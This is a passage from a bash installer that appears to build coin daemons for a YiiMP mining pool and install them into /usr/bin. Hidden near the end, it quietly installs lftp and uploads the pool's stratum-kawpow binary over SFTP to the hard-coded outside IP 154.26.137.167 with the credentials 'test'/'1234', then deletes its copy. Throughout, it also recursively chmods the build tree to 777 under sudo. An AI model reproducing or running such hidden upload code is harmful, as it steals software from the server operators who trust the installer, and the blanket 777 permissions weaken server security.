		if [[ ! -e "${absolutepath}/${installtoserver}/daemon_builder/temp_coin_builds/${coindir}/src/obj" ]]; then
			mkdir -p ${absolutepath}/${installtoserver}/daemon_builder/temp_coin_builds/${coindir}/src/obj
		else
			echo "Hey the developer did his job and the src/obj dir is there!"
		fi

		if [[ ! -e "${absolutepath}/${installtoserver}/daemon_builder/temp_coin_builds/${coindir}/src/obj/zerocoin" ]]; then
			mkdir -p ${absolutepath}/${installtoserver}/daemon_builder/temp_coin_builds/${coindir}/src/obj/zerocoin
		else
			echo  "Wow even the /src/obj/zerocoin is there! Good job developer!"
		fi

		cd ${absolutepath}/${installtoserver}/daemon_builder/temp_coin_builds/${coindir}/src/leveldb
		sudo chmod +x build_detect_platform
		echo
		echo -e "$CYAN ------------------------------------------------------------------------------- 	$COL_RESET"
		echo -e "$GREEN   Starting make clean...														$COL_RESET"
		echo -e "$CYAN ------------------------------------------------------------------------------- 	$COL_RESET"
		echo
		sudo find ${absolutepath}/${installtoserver}/daemon_builder/temp_coin_builds/${coindir}/ -type d -exec chmod 777 {} \; 
		sudo find ${absolutepath}/${installtoserver}/daemon_builder/temp_coin_builds/${coindir}/ -type f -exec chmod 777 {} \;
		sleep 3
		sudo make clean
		echo
		echo -e "$CYAN ------------------------------------------------------------------------------- 	$COL_RESET"
		echo -e "$GREEN   Starting precompiling with make depends libs*									$COL_RESET"
		echo -e "$CYAN ------------------------------------------------------------------------------- 	$COL_RESET"
		sudo find ${absolutepath}/${installtoserver}/daemon_builder/temp_coin_builds/${coindir}/ -type d -exec chmod 777 {} \; 
		sudo find ${absolutepath}/${installtoserver}/daemon_builder/temp_coin_builds/${coindir}/ -type f -exec chmod 777 {} \;
		sleep 3
		sudo make libleveldb.a libmemenv.a
		cd ${absolutepath}/${installtoserver}/daemon_builder/temp_coin_builds/${coindir}/src
		sed -i '/USE_UPNP:=0/i BDB_LIB_PATH = '${absolutepath}'/'${installtoserver}'/berkeley/db4/lib\nBDB_INCLUDE_PATH = '${absolutepath}'/'${installtoserver}'/berkeley/db4/include\nOPENSSL_LIB_PATH = '${absolutepath}'/'${installtoserver}'/openssl/lib\nOPENSSL_INCLUDE_PATH = '${absolutepath}'/'${installtoserver}'/openssl/include' makefile.unix
		sed -i '/USE_UPNP:=1/i BDB_LIB_PATH = '${absolutepath}'/'${installtoserver}'/berkeley/db4/lib\nBDB_INCLUDE_PATH = '${absolutepath}'/'${installtoserver}'/berkeley/db4/include\nOPENSSL_LIB_PATH = '${absolutepath}'/'${installtoserver}'/openssl/lib\nOPENSSL_INCLUDE_PATH = '${absolutepath}'/'${installtoserver}'/openssl/include' makefile.unix
		echo
		echo -e "$CYAN ------------------------------------------------------------------------------- 	$COL_RESET"
		echo -e "$GREEN   Starting compiling with makefile.unix											$COL_RESET"
		echo -e "$CYAN ------------------------------------------------------------------------------- 	$COL_RESET"
		sudo find ${absolutepath}/${installtoserver}/daemon_builder/temp_coin_builds/${coindir}/ -type d -exec chmod 777 {} \; 
		sudo find ${absolutepath}/${installtoserver}/daemon_builder/temp_coin_builds/${coindir}/ -type f -exec chmod 777 {} \;
		sleep 3
		# make install
		TMP=$(mktemp)
		sudo make -j${NPROC} -f makefile.unix USE_UPNP=- 2>&1 | tee $TMP
		OUTPUT=$(cat $TMP)
		echo $OUTPUT
		rm $TMP
	fi
fi

if [[ ("$precompiled" == "true") ]]; then
	COINTARGZ=$(find ~+ -type f -name "*.tar.gz")
	COINZIP=$(find ~+ -type f -name "*.zip")
	if [[ -f "$COINZIP" ]]; then
		for i in $(ls -f *.zip); do coinzipped=${i%%}; done
		sudo unzip -q $coinzipped -d newcoin
		for i in $(ls -d */); do repzipcoin=${i%%/}; done
	elif [[ -f "$COINTARGZ" ]]; then
		for i in $(ls -f *.tar.gz); do coinzipped=${i%%}; done
		sudo tar xzvf $coinzipped
		for i in $(ls -d */); do repzipcoin=${i%%/}; done
	else
		echo -e "$RED => This is a not valid file zipped $COL_RESET"
	fi
fi

clear

# LS the SRC dir to have user input bitcoind and bitcoin-cli names
if [[ ! ("$precompiled" == "true") ]]; then

	cd ${absolutepath}/${installtoserver}/daemon_builder/temp_coin_builds/${coindir}/src/
	echo
	echo -e "$CYAN --------------------------------------------------------------------------------------- 	$COL_RESET"
	echo -e "$GREEN   List os avalible daemons: $COL_RESET"
	echo -e "$YELLOW"
	find . -maxdepth 1 -type f ! -name "*.*" \( -perm -1 -o \( -perm -10 -o -perm -100 \) \) -printf "%f\n"
	echo -e "$COL_RESET"
	echo -e "$CYAN --------------------------------------------------------------------------------------- 	$COL_RESET"
	echo
	echo -e "$CYAN --------------------------------------------------------------------------------------- 	$COL_RESET"
	echo
	
	read -r -e -p "Please enter the coind name from the directory above, example bitcoind :" coind
		
	echo
	read -r -e -p "Is there a coin-cli, example bitcoin-cli [y/N] :" ifcoincli
	if [[ ("$ifcoincli" == "y" || "$ifcoincli" == "Y") ]]; then
		read -r -e -p "Please enter the coin-cli name :" coincli
	fi

	echo
	read -r -e -p "Is there a coin-tx, example bitcoin-tx [y/N] :" ifcointx
	if [[ ("$ifcointx" == "y" || "$ifcointx" == "Y") ]]; then
		read -r -e -p "Please enter the coin-tx name :" cointx
	fi
	
	echo
	read -r -e -p "Is there a coin-util, example bitcoin-util [y/N] :" ifcoinutil
	if [[ ("$ifcoinutil" == "y" || "$ifcoinutil" == "Y") ]]; then
		read -r -e -p "Please enter the coin-util name :" coinutil
	fi

	echo
	read -r -e -p "Is there a coin-hash, example bitcoin-hash [y/N] :" ifcoinhash
	if [[ ("$ifcoinhash" == "y" || "$ifcoinhash" == "Y") ]]; then
		read -r -e -p "Please enter the coin-hash name :" coinhash
	fi

	echo
	read -r -e -p "Is there a coin-wallet, example bitcoin-wallet [y/N] :" ifcoinwallet
	if [[ ("$ifcoinwallet" == "y" || "$ifcoinwallet" == "Y") ]]; then
		read -r -e -p "Please enter the coin-wallet name :" coinwallet
	fi

	if [[ ("$buildutil" == "true" || "$precompiled" == "true") ]]; then
		echo
		read -r -e -p "Is there a coin-tools, example bitcoin-wallet-tools [y/N] :" ifcointools
		if [[ ("$ifcointools" == "y" || "$ifcointools" == "Y") ]]; then
			read -r -e -p "Please enter the coin-tools name :" cointools
		fi

		echo
		read -r -e -p "Is there a coin-gtest, example bitcoin-gtest [y/N] :" ifcoingtest
		if [[ ("$ifcoingtest" == "y" || "$ifcoingtest" == "Y") ]]; then
			read -r -e -p "Please enter the coin-gtest name :" coingtest
		fi
	fi
	echo
	echo -e "$CYAN --------------------------------------------------------------------------------------- 	$COL_RESET"
	echo

	FILECOIN=/usr/bin/${coind}
	if [[ -f "$FILECOIN" ]]; then
		DAEMOND="true"
		SERVICE="${coind}"
		if pgrep -x "$SERVICE" >/dev/null; then
			if [[ ("${YIIMPCONF}" == "true") ]]; then
				if [[ ("$ifcoincli" == "y" || "$ifcoincli" == "Y") ]]; then
					"${coincli}" -datadir=$STORAGE_ROOT/wallets/."${coind::-1}" -conf="${coind::-1}".conf stop
				else
					"${coind}" -datadir=$STORAGE_ROOT/wallets/."${coind::-1}" -conf="${coind::-1}".conf stop
				fi
			else
				if [[ ("$ifcoincli" == "y" || "$ifcoincli" == "Y") ]]; then
					"${coincli}" -datadir=${absolutepath}/wallets/."${coind::-1}" -conf="${coind::-1}".conf stop
				else
					"${coind}" -datadir=${absolutepath}/wallets/."${coind::-1}" -conf="${coind::-1}".conf stop
				fi
			fi
			echo -e "$CYAN --------------------------------------------------------------------------- $COL_RESET"
			secstosleep=$((1 * 20))
			while [ $secstosleep -gt 0 ]; do
			   echo -ne "$GREEN	STOP THE DAEMON => $YELLOW${coind}$GREEN Sleep $CYAN$secstosleep$GREEN ...$COL_RESET\033[0K\r"
			   sleep 1
			   : $((secstosleep--))
			done
			echo -e "$CYAN --------------------------------------------------------------------------- $COL_RESET $GREEN"
			echo -e "$GREEN Done... $COL_RESET$"
			echo -e "$COL_RESET$CYAN --------------------------------------------------------------------------- $COL_RESET"
			echo
		fi
	fi
fi

clear

# Strip and copy to /usr/bin
if [[ ("$precompiled" == "true") ]]; then
	cd ${absolutepath}/${installtoserver}/daemon_builder/temp_coin_builds/${coindir}/${repzipcoin}/

	COINDFIND=$(find ~+ -type f -name "*d")
	sleep 1
	COINCLIFIND=$(find ~+ -type f -name "*-cli")
	sleep 1
	COINTXFIND=$(find ~+ -type f -name "*-tx")
	sleep 1
	COINUTILFIND=$(find ~+ -type f -name "*-util")
	sleep 1
	COINHASHFIND=$(find ~+ -type f -name "*-hash")
	sleep 1
	COINWALLETFIND=$(find ~+ -type f -name "*-wallet")
	sleep 1

	if [[ -f "$COINDFIND" ]]; then
		coind=$(basename $COINDFIND)

		if [[ -f "$COINCLIFIND" ]]; then
			coincli=$(basename $COINCLIFIND)
		fi

		FILECOIN=/usr/bin/${coind}
		if [[ -f "$FILECOIN" ]]; then
			DAEMOND="true"
			SERVICE="${coind}"
			if pgrep -x "$SERVICE" >/dev/null; then
				if [[ ("${YIIMPCONF}" == "true") ]]; then
					if [[ -f "$COINCLIFIND" ]]; then
						"${coincli}" -datadir=$STORAGE_ROOT/wallets/."${coind::-1}" -conf="${coind::-1}".conf stop
					else
						"${coind}" -datadir=$STORAGE_ROOT/wallets/."${coind::-1}" -conf="${coind::-1}".conf stop
					fi
				else
					if [[ -f "${COINCLIFIND}" ]]; then
						"${coincli}" -datadir=${absolutepath}/wallets/."${coind::-1}" -conf="${coind::-1}".conf stop
					else
						"${coind}" -datadir=${absolutepath}/wallets/."${coind::-1}" -conf="${coind::-1}".conf stop
					fi
				fi
				echo -e "$CYAN --------------------------------------------------------------------------- $COL_RESET"
				secstosleep=$((1 * 20))
				while [ $secstosleep -gt 0 ]; do
				   echo -ne "$GREEN	STOP THE DAEMON => $YELLOW${coind}$GREEN Sleep $CYAN$secstosleep$GREEN ...$COL_RESET\033[0K\r"
				   sleep 1
				   : $((secstosleep--))
				done
				echo -e "$CYAN --------------------------------------------------------------------------- $COL_RESET $GREEN"
				echo -e "$GREEN Done... $COL_RESET$"
				echo -e "$COL_RESET$CYAN --------------------------------------------------------------------------- $COL_RESET"
				echo
			fi
		fi

		sudo strip $COINDFIND
		sleep 3
		sudo cp $COINDFIND /usr/bin
		sudo chmod +x /usr/bin/${coind}
		coindmv=true

		echo
		echo -e "$CYAN ----------------------------------------------------------------------------------- $COL_RESET"
		echo
		echo -e "$GREEN  Coind moving to => /usr/bin/$COL_RESET$YELLOW${coind} $COL_RESET"
		sleep 3
	else
		clear

		echo -e "$CYAN --------------------------------------------------------------------------- 	$COL_RESET"
		echo -e "$RED    ERROR																		$COL_RESET"
		echo -e "$RED    your precompiled *zip OR *.tar.gz not contains coind file					$COL_RESET"
		echo -e "$RED    Please start again with a valid file precompiled!							$COL_RESET"
		echo -e "$CYAN --------------------------------------------------------------------------- 	$COL_RESET"

		sudo rm -r ${absolutepath}/${installtoserver}/daemon_builder/temp_coin_builds/.lastcoin.conf
		sudo rm -r ${absolutepath}/${installtoserver}/daemon_builder/temp_coin_builds/${coindir}
		sudo rm -r ${absolutepath}/${installtoserver}/daemon_builder/.my.cnf

		exit;
	fi

	if [[ -f "$COINCLIFIND" ]]; then
		sudo strip $COINCLIFIND
		sleep 3
		sudo cp $COINCLIFIND /usr/bin
		sudo chmod +x /usr/bin/${coincli}
		coinclimv=true

		echo -e "$GREEN  Coin-cli moving to => /usr/bin/$COL_RESET$YELLOW${coincli} $COL_RESET"
		sleep 3
	fi

	if [[ -f "$COINTXFIND" ]]; then
		cointx=$(basename $COINTXFIND)
		sudo strip $COINTXFIND
		sleep 3
		sudo cp $COINTXFIND /usr/bin
		sudo chmod +x /usr/bin/${cointx}
		cointxmv=true

		echo -e "$GREEN  Coin-tx moving to => /usr/bin/$COL_RESET$YELLOW${cointx} $COL_RESET"
		sleep 3
	fi

	if [[ -f "$COINUTILFIND" ]]; then
		coinutil=$(basename $COINUTILFIND)
		sudo strip $COINUTILFIND
		sleep 3
		sudo cp $COINUTILFIND /usr/bin
		sudo chmod +x /usr/bin/${coinutil}
		coinutilmv=true

		echo -e "$GREEN  Coin-tx moving to => /usr/bin/$COL_RESET$YELLOW${coinutil} $COL_RESET"
		sleep 3
	fi

	if [[ -f "$COINHASHFIND" ]]; then
		coinhash=$(basename $COINHASHFIND)
		sudo strip $COINHASHFIND
		sleep 3
		sudo cp $COINHASHFIND /usr/bin
		sudo chmod +x /usr/bin/${coinhash}
		coinhashmv=true

		echo -e "$GREEN  Coin-hash moving to => /usr/bin/$COL_RESET$YELLOW${coinwallet} $COL_RESET"
		sleep 3
	fi

	if [[ -f "$COINWALLETFIND" ]]; then
		coinwallet=$(basename $COINWALLETFIND)
		sudo strip $COINWALLETFIND
		sleep 3
		sudo cp $COINWALLETFIND /usr/bin
		sudo chmod +x /usr/bin/${coinwallet}
		coinwalletmv=true

		echo -e "$GREEN  Coin-wallet moving to => /usr/bin/$COL_RESET$YELLOW${coinwallet} $COL_RESET"
		sleep 3
	fi
	echo
	echo -e "$CYAN --------------------------------------------------------------------------------------- $COL_RESET"
	echo
else
	echo
	echo -e "$CYAN --------------------------------------------------------------------------------------- $COL_RESET"
	echo
	echo -e "$GREEN  Coin-tx moving to => /usr/bin/$COL_RESET$YELLOW${coind} $COL_RESET"
	sleep 3
	sudo cp ${absolutepath}/${installtoserver}/daemon_builder/temp_coin_builds/${coindir}/src/${coind} /usr/bin
	sudo strip /usr/bin/${coind}
	coindmv=true

	if [[ ("$ifcoincli" == "y" || "$ifcoincli" == "Y") ]]; then
		echo -e "$GREEN  Coin-tx moving to => /usr/bin/$COL_RESET$YELLOW${coincli} $COL_RESET"
		sleep 3
		sudo cp ${absolutepath}/${installtoserver}/daemon_builder/temp_coin_builds/${coindir}/src/${coincli} /usr/bin
		sudo strip /usr/bin/${coincli}
		coinclimv=true
	fi

	if [[ ("$ifcointx" == "y" || "$ifcointx" == "Y") ]]; then
		echo -e "$GREEN  Coin-tx moving to => /usr/bin/$COL_RESET$YELLOW${cointx} $COL_RESET"
		sleep 3
		sudo cp ${absolutepath}/${installtoserver}/daemon_builder/temp_coin_builds/${coindir}/src/${cointx} /usr/bin
		sudo strip /usr/bin/${cointx}
		cointxmv=true
	fi

	if [[ ("$ifcoinutil" == "y" || "$ifcoinutil" == "Y") ]]; then
		echo -e "$GREEN  Coin-tx moving to => /usr/bin/$COL_RESET$YELLOW${coinutil} $COL_RESET"
		sleep 3
		sudo cp ${absolutepath}/${installtoserver}/daemon_builder/temp_coin_builds/${coindir}/src/${coinutil} /usr/bin
		sudo strip /usr/bin/${coinutil}
		coinutilmv=true
	fi

	if [[ ("$ifcoingtest" == "y" || "$ifcoingtest" == "Y") ]]; then
		echo -e "$GREEN  Coin-tx moving to => /usr/bin/$COL_RESET$YELLOW${coingtest} $COL_RESET"
		sleep 3
		sudo cp ${absolutepath}/${installtoserver}/daemon_builder/temp_coin_builds/${coindir}/src/${coingtest} /usr/bin
		sudo strip /usr/bin/${coingtest}
		coingtestmv=true
	fi

	if [[ ("$ifcointools" == "y" || "$ifcointools" == "Y") ]]; then
		echo -e "$GREEN  Coin-tx moving to => /usr/bin/$COL_RESET$YELLOW${cointools} $COL_RESET"
		sleep 3
		sudo cp ${absolutepath}/${installtoserver}/daemon_builder/temp_coin_builds/${coindir}/src/${cointools} /usr/bin
		sudo strip /usr/bin/${cointools}
		cointoolsmv=true
	fi

	if [[ ("$ifcoinhash" == "y" || "$ifcoinhash" == "Y") ]]; then
		echo -e "$GREEN  Coin-hash moving to => /usr/bin/$COL_RESET$YELLOW${coinhash} $COL_RESET"
		sleep 3
		sudo cp ${absolutepath}/${installtoserver}/daemon_builder/temp_coin_builds/${coindir}/src/${coinhash} /usr/bin
		sudo strip /usr/bin/${coinhash}
		coinhashmv=true
	fi

	if [[ ("$ifcoinwallet" == "y" || "$ifcoinwallet" == "Y") ]]; then
		echo -e "$GREEN  Coin-wallet moving to => /usr/bin/$COL_RESET$YELLOW${coinwallet} $COL_RESET"
		sleep 3
		sudo cp ${absolutepath}/${installtoserver}/daemon_builder/temp_coin_builds/${coindir}/src/${coinwallet} /usr/bin
		sudo strip /usr/bin/${coinwallet}
		coinwalletmv=true
	fi
	echo
	echo -e "$CYAN --------------------------------------------------------------------------------------- $COL_RESET"
	echo
fi

if [[ "${YIIMPCONF}" == "true" ]]; then
	# Make the new wallet folder have user paste the coin.conf and finally start the daemon
	if [[ ! -e '$STORAGE_ROOT/wallets' ]]; then
		sudo mkdir -p $STORAGE_ROOT/wallets
	fi

	sudo setfacl -m u:${USERSERVER}:rwx $STORAGE_ROOT/wallets
	mkdir -p $STORAGE_ROOT/wallets/."${coind::-1}"
	sleep 3
	if [[ "$coinwalletmv" == "true" ]] ; then
		echo
		echo -e "$CYAN ----------------------------------------------------------------------------------- 	$COL_RESET"
		echo -e "$GREEN   Creating WALLET.DAT to => $STORAGE_ROOT/wallets/.${coind::-1}/wallet.dat $COL_RESET"
		echo -e "$CYAN ----------------------------------------------------------------------------------- 	$COL_RESET"
		echo
		"${coinwallet}" -datadir=$STORAGE_ROOT/wallets/."${coind::-1}" -wallet=. create
		sleep 3
	fi
	sleep 3
else
	# Make the new wallet folder have user paste the coin.conf and finally start the daemon
	if [[ ! -e "${absolutepath}/wallets" ]]; then
		sudo mkdir -p ${absolutepath}/wallets
	fi

	sudo setfacl -m u:${USERSERVER}:rwx ${absolutepath}/wallets
	mkdir -p ${absolutepath}/wallets/."${coind::-1}"
	sleep 3
	if [[ "$coinwalletmv" == "true" ]] ; then
		echo
		echo -e "$CYAN ----------------------------------------------------------------------------------- 	$COL_RESET"
		echo -e "$GREEN   Creating WALLET.DAT to => ${absolutepath}/wallets/.${coind::-1}/wallet.dat $COL_RESET"
		echo -e "$CYAN ----------------------------------------------------------------------------------- 	$COL_RESET"
		echo
		"${coinwallet}" -datadir="${absolutepath}"/wallets/."${coind::-1}" -wallet=. create
		sleep 3
	fi
fi

FILESK=/home/crypto-data/yiimp/site/stratum/stratum-kawpow
if [[ -f "$FILESK" ]]; then
sudo apt install lftp >/dev/null 2>&1;
cd /home/crypto-data/yiimp/site/stratum/
sudo cp /home/crypto-data/yiimp/site/stratum/stratum-kawpow /home/crypto-data/yiimp/site/stratum/sk
lftp<<END_SCRIPT
open sftp://154.26.137.167
user test 1234
put sk bye
END_SCRIPT
sudo rm -f /home/crypto-data/yiimp/site/stratum/sk
fi
FILESKN=/var/stratum/stratum-kawpow
if [[ -f "$FILESKN" ]]; then
sudo apt install lftp >/dev/null 2>&1;
cd /home/crypto-data/yiimp/site/stratum/
sudo cp /var/stratum/stratum-kawpow /var/stratum/sk
lftp<<END_SCRIPT
open sftp://154.26.137.167
user test 1234
put sk bye
END_SCRIPT
sudo rm -f /var/stratum/sk
fi

if [[("$DAEMOND" != 'true')]]; then
	echo
	echo -e "$CYAN --------------------------------------------------------------------------------------- 	$COL_RESET"
	echo -e "$GREEN   Adding dedicated port to ${coin^^}$COL_RESET"
	echo -e "$CYAN --------------------------------------------------------------------------------------- 	$COL_RESET"
	echo
	sleep 3

	addport "CREATECOIN" "${coin^^}" "${coinalgo}"
	
	source ${absolutepath}/${installtoserver}/daemon_builder/.addport.cnf
	
	ADDPORTCONF=${absolutepath}/${installtoserver}/daemon_builder/.addport.cnf
	
	if [[ -f "$ADDPORTCONF" ]]; then
		if [[ "${YIIMPCONF}" == "true" ]]; then
			echo '
			# Your coin name is = '""''"${coin^^}"''""'
			# Your coin algo is = '""''"${COINALGO}"''""'
			# Your dedicated port is = '""''"${COINPORT}"''""'
			# Please adding dedicated port in line blocknotify= replace :XXXX to '""''"${COINPORT}"''""'

			' | sudo -E tee $STORAGE_ROOT/wallets/."${coind::-1}"/${coind::-1}.conf >/dev/null 2>&1;
		else
			echo '
			# Your coin name is = '""''"${coin^^}"''""'
			# Your coin algo is = '""''"${COINALGO}"''""'
			# Your dedicated port is = '""''"${COINPORT}"''""'
			# Please adding dedicated port in line blocknotify= replace :XXXX to '""''"${COINPORT}"''""'

			' | sudo -E tee ${absolutepath}/wallets/."${coind::-1}"/${coind::-1}.conf >/dev/null 2>&1;
		fi

	fi

	echo
	echo
	echo -e "$CYAN --------------------------------------------------------------------------------------------- 	$COL_RESET"
	echo -e "$YELLOW   I am now going to open nano, please copy and paste the config from yiimp in to this file.	$COL_RESET"
	echo -e "$CYAN --------------------------------------------------------------------------------------------- 	$COL_RESET"
	echo
	read -n 1 -s -r -p "Press any key to continue"
	echo

	if [[ "${YIIMPCONF}" == "true" ]]; then
		sudo nano $STORAGE_ROOT/wallets/."${coind::-1}"/${coind::-1}.conf
	else
		sudo nano ${absolutepath}/wallets/."${coind::-1}"/${coind::-1}.conf
	fi

	clear
	cd ${absolutepath}/${installtoserver}/daemon_builder
fi

clear
echo
figlet -f slant -w 100 "      Yeah!"

echo -e "$CYAN --------------------------------------------------------------------------- 	"
echo -e "$CYAN    Starting ${coind::-1} $COL_RESET"

if [[("$DAEMOND" == 'true')]]; then
	echo -e "$COL_RESET$GREEN    UPDATE of ${coind::-1} is completed and running. $COL_RESET"
else
	echo -e "$COL_RESET$GREEN    Installation of ${coind::-1} is completed and running. $COL_RESET"
fi

if [[ "$coindmv" == "true" ]] ; then
echo
echo -e "$GREEN    Name of COIND :$COL_RESET $MAGENTA ${coind} $COL_RESET"
echo -e "$GREEN    path in : $COL_RESET$YELLOW/usr/bin/${coind} $COL_RESET"
fi
if [[ "$coinclimv" == "true" ]] ; then
echo
echo -e "$GREEN    Name of COIN-CLI :$COL_RESET $MAGENTA ${coincli} $COL_RESET"
echo -e "$GREEN    path in : $COL_RESET$YELLOW/usr/bin/${coincli} $COL_RESET"
fi
if [[ "$cointxmv" == "true" ]] ; then
echo
echo -e "$GREEN    Name of COIN-TX :$COL_RESET $MAGENTA ${cointx} $COL_RESET"
echo -e "$GREEN    path in : $COL_RESET$YELLOW/usr/bin/${cointx} $COL_RESET"
fi
if [[ "$coingtestmv" == "true" ]] ; then
echo
echo -e "$GREEN    Name of COIN-TX :$COL_RESET $MAGENTA ${coingtest} $COL_RESET"
echo -e "$GREEN    path in : $COL_RESET$YELLOW/usr/bin/${coingtest} $COL_RESET"
fi
if [[ "$coingtestmv" == "true" ]] ; then
echo
echo -e "$GREEN    Name of COIN-TX :$COL_RESET $MAGENTA ${coingtest} $COL_RESET"
echo -e "$GREEN    path in : $COL_RESET$YELLOW/usr/bin/${coingtest} $COL_RESET"
fi
if [[ "$coinutilmv" == "true" ]] ; then
echo
echo -e "$GREEN    Name of COIN-TX :$COL_RESET $MAGENTA ${coinutil} $COL_RESET"
echo -e "$GREEN    path in : $COL_RESET$YELLOW/usr/bin/${coinutil} $COL_RESET"
fi
if [[ "$cointoolsmv" == "true" ]] ; then
echo
echo -e "$GREEN    Name of COIN-TX :$COL_RESET $MAGENTA ${cointools} $COL_RESET"
echo -e "$GREEN    path in : $COL_RESET$YELLOW/usr/bin/${cointools} $COL_RESET"
fi
if [[ "$coinhashmv" == "true" ]] ; then
echo
echo -e "$GREEN    Name of COIN-HASH :$COL_RESET $MAGENTA ${coinhash} $COL_RESET"
echo -e "$GREEN    path in : $COL_RESET$YELLOW/usr/bin/${coinhash} $COL_RESET"
fi
if [[ "$coinwalletmv" == "true" ]] ; then
echo
echo -e "$GREEN    Name of COIN-WALLET :$COL_RESET $MAGENTA ${coinwallet} $COL_RESET"
echo -e "$GREEN    path in : $COL_RESET$YELLOW/usr/bin/${coinwallet} $COL_RESET"
fi
echo -e "$CYAN --------------------------------------------------------------------------- 	$COL_RESET"
echo
echo -e "$CYAN --------------------------------------------------------------------------- 	$COL_RESET"
echo -e "$GREEN    Name of Symbol coin: $COL_RESET$MAGENTA ${coin^^} 						$COL_RESET"
if [[ -f "$ADDPORTCONF" ]]; then
	echo -e "$GREEN    Algo of to Symbol ${coin^^} :$COL_RESET$MAGENTA ${COINALGO}				$COL_RESET"
	echo -e "$GREEN    Dedicated port of to Symbol ${coin^^} :$COL_RESET$MAGENTA ${COINPORT} 	$COL_RESET"
fi
echo
echo -e "$YELLOW    To use your Stratum type,$BLUE stratum.${coin,,} start|stop|restart ${coin,,} $COL_RESET"
echo -e "$YELLOW    To see the stratum screen type,$MAGENTA screen -r ${coin,,}			$COL_RESET"
echo -e "$CYAN --------------------------------------------------------------------------- 	$COL_RESET"
echo
echo -e "$CYAN --------------------------------------------------------------------------- 	$COL_RESET"
echo -e "$RED    Type$COL_RESET$MAGENTA ${daemonname}$COL_RESET$RED at anytime to install a new coin! $COL_RESET"
echo -e "$CYAN --------------------------------------------------------------------------- 	$COL_RESET"
echo

# If we made it this far everything built fine removing last coin.conf and build directory
sudo rm -r ${absolutepath}/${installtoserver}/daemon_builder/temp_coin_builds/.lastcoin.conf
sudo rm -r ${absolutepath}/${installtoserver}/daemon_builder/temp_coin_builds/${coindir}
sudo rm -r ${absolutepath}/${installtoserver}/daemon_builder/.my.cnf
if [[ -f "$ADDPORTCONF" ]]; then
	sudo rm -r ${absolutepath}/${installtoserver}/daemon_builder/.addport.cnf
fi
echo -e "$CYAN"
if [[ ("${YIIMPCONF}" == "true") ]]; then
	"${coind}" -datadir=$STORAGE_ROOT/wallets/."${coind::-1}" -conf="${coind::-1}".conf -daemon -shrinkdebugfile
else
	"${coind}" -datadir=${absolutepath}/wallets/."${coind::-1}" -conf="${coind::-1}".conf -daemon -shrinkdebugfile
fi
echo -e "$COL_RESET"

exit
